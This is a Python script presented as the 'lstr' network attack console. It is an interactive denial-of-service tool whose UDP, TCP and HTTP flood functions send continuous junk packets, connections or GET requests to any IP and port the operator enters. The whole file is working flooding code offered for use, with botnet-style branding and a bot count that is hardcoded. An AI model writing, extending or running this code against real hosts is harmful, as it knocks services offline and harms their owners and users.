#!/usr/bin/env python3
# ================================================
# lstr – STOL3N/MEV NET CONSOLE (FULL NEW SCREEN)
# ================================================

import os, sys, socket, threading, random, time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ---------- ENABLE ANSI COLORS ----------
if os.name == 'nt':
    os.system('')

# ---------- COLORS ----------
R = "\033[91m"; W = "\033[97m"; C = "\033[0m"

# ---------- TOOL INFO ----------
TOOL_NAME   = "lstr"
USER        = "stol3n/mev"
ACTIVE_BOTS = 3

# ---------- BANNER ----------
BANNER = f"""{R}
        __  _         _          
       / / | |       | |         
      / /  | |  ___  | |_   _ __ 
     / /   | | / __| | __| | '__|
    / /    | | \__ \ | |_  | |   
   /_/     |_| |___/  \__| |_|   
                                 
 
{W} >>> {TOOL_NAME.upper()} NET <<<{C}
"""

HINTS = f"""{W}>> type {R}help{C}
>> type {R}methods{C}
>> type {R}plan{C}
>> type {R}exit{C}
"""

# ---------- DYNAMIC TITLE ----------
def set_title(screen="HOME"):
    status = "ATTACKING" if ATTACK_RUNNING else "IDLE"
    title = f"lstr Net - Bots: {ACTIVE_BOTS} - {status} - {screen}"
    if os.name == 'nt':
        os.system(f'title {title}')
    else:
        sys.stdout.write(f'\33]0;{title}\a')
        sys.stdout.flush()

# ---------- ATTACK STATE ----------
ATTACK_RUNNING = False
ATTACK_THREAD  = None
ATTACK_STATS   = {"sent": 0, "target": "", "method": "", "start_time": 0}

# ========================================
# FULL SCREEN FUNCTIONS
# ========================================
def full_clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_home():
    full_clear()
    print(BANNER)
    print(HINTS)
    set_title("HOME")

def show_help():
    full_clear()
    print(f"""{W}
{R}attack{C}  <ip> <port> <threads> <sec> <method>
{R}stop{C}     stop attack
{R}methods{C}  list methods
{R}plan{C}     your access
{R}home{C}     return to main
{R}exit{C}     quit
{W}""")
    print(f"\n{W}Type {R}home{C} to return.")
    set_title("HELP")

def show_methods():
    full_clear()
    print(f"""{W}
{R}UDP{C}   – Raw packet flood
{R}TCP{C}   – Connection flood
{R}HTTP{C}  – Request flood
{W}""")
    print(f"\n{W}Type {R}home{C} to return.")
    set_title("METHODS")

def show_plan():
    full_clear()
    print(f"""{W}
{R}{USER.upper()}{W}
{R}{ACTIVE_BOTS:,}{W}
{R}{datetime.now().strftime('%H:%M:%S')}{W}
{R}{'ATTACKING' if ATTACK_RUNNING else 'IDLE'}{W}
{W}""")
    print(f"\n{W}Type {R}home{C} to return.")
    set_title("PLAN")

def show_attack(ip, port, threads, duration, method):
    global ATTACK_RUNNING, ATTACK_THREAD, ATTACK_STATS
    if ATTACK_RUNNING:
        full_clear()
        print(f"{R}[!] Already attacking{C}\n")
        print(f"{W}Type {R}home{C} to return.")
        set_title("ERROR")
        return
    if method not in ATTACK_MAP:
        full_clear()
        print(f"{R}[!] Invalid method: {method}{C}\n")
        print(f"{W}Type {R}home{C} to return.")
        set_title("ERROR")
        return

    full_clear()
    print(f"{W}[ATTACK LAUNCHED]\n")
    print(f"    Target  : {R}{ip}:{port}{W}")
    print(f"    Method  : {R}{method.upper()}{W}")
    print(f"    Threads : {R}{threads}{W}")
    print(f"    Duration: {R}{duration}s{W}\n")
    print(f"{W}Attack running... Type {R}home{C} when done.\n")
    set_title(f"ATTACK • {method.upper()}")

    ATTACK_RUNNING = True
    ATTACK_STATS = {
        "sent": 0,
        "target": f"{ip}:{port}",
        "method": method.upper(),
        "start_time": time.time()
    }

    def run():
        ATTACK_MAP[method](ip, port, duration)
        global ATTACK_RUNNING
        ATTACK_RUNNING = False
        print(f"\n{W}[ATTACK COMPLETE] Type {R}home{C} to return.")
        set_title("HOME")

    ATTACK_THREAD = threading.Thread(target=run, daemon=True)
    ATTACK_THREAD.start()

# ========================================
# ATTACK METHODS (PRINT TO CURRENT SCREEN)
# ========================================
ATTACK_MAP = {}

def udp_flood(ip, port, duration):
    global ATTACK_STATS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    sent = 0
    end = time.time() + duration
    while time.time() < end and ATTACK_RUNNING:
        try:
            sock.sendto(payload, (ip, port))
            sent += 1
            ATTACK_STATS["sent"] = sent
            if sent % 1000 == 0:
                elapsed = int(time.time() - ATTACK_STATS["start_time"])
                print(f"{W}[UDP] {sent:,} pkts | {elapsed}s → {ip}:{port}{C}")
        except:
            pass

def tcp_flood(ip, port, duration):
    global ATTACK_STATS
    sent = 0
    end = time.time() + duration
    while time.time() < end and ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(b"\x00" * 1024)
            s.close()
            sent += 1
            ATTACK_STATS["sent"] = sent
        except:
            pass

def http_flood(ip, port, duration):
    global ATTACK_STATS
    payload = f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nUser-Agent: {TOOL_NAME}\r\n\r\n".encode()
    sent = 0
    end = time.time() + duration
    while time.time() < end and ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(payload)
            s.close()
            sent += 1
            ATTACK_STATS["sent"] = sent
        except:
            pass

ATTACK_MAP = {"udp": udp_flood, "tcp": tcp_flood, "http": http_flood}

# ========================================
# MAIN LOOP
# ========================================
def main():
    show_home()

    while True:
        try:
            cmd_input = input(f"{R}{USER}@{TOOL_NAME.lower()}{W}> {C}").strip()
            if not cmd_input:
                continue
            cmd = cmd_input.lower().split()
            action = cmd[0]

            if action == "home":
                show_home()

            elif action == "help":
                show_help()
            elif action == "methods":
                show_methods()
            elif action == "plan":
                show_plan()

            elif action == "attack" and len(cmd) == 6:
                try:
                    ip = cmd[1]
                    port = int(cmd[2])
                    threads = int(cmd[3])
                    duration = int(cmd[4])
                    method = cmd[5]
                    show_attack(ip, port, threads, duration, method)
                except:
                    full_clear()
                    print(f"{R}[!] Invalid format{C}\n")
                    print(f"{W}Type {R}home{C} to return.")
                    set_title("ERROR")

            elif action == "stop":
                if ATTACK_RUNNING:
                    ATTACK_RUNNING = False
                    full_clear()
                    print(f"{R}[!] Attack stopped by user{C}\n")
                    print(f"{W}Type {R}home{C} to return.")
                    set_title("STOPPED")
                else:
                    full_clear()
                    print(f"{R}[!] No attack running{C}\n")
                    print(f"{W}Type {R}home{C} to return.")
                    set_title("IDLE")

            elif action in ("exit", "quit"):
                if ATTACK_RUNNING:
                    ATTACK_RUNNING = False
                full_clear()
                print(f"{W}Shutting down…{C}")
                time.sleep(1)
                break

            else:
                full_clear()
                print(f"{R}?? unknown command{C}\n")
                print(f"{W}Type {R}home{C} to return.")
                set_title("ERROR")

        except KeyboardInterrupt:
            full_clear()
            print(f"{R}Ctrl+C detected – use 'exit'{C}\n")
            print(f"{W}Type {R}home{C} to return.")
        except EOFError:
            break
        except Exception as e:
            full_clear()
            print(f"{R}Error: {e}{C}\n")
            print(f"{W}Type {R}home{C} to return.")

if __name__ == "__main__":
    main()
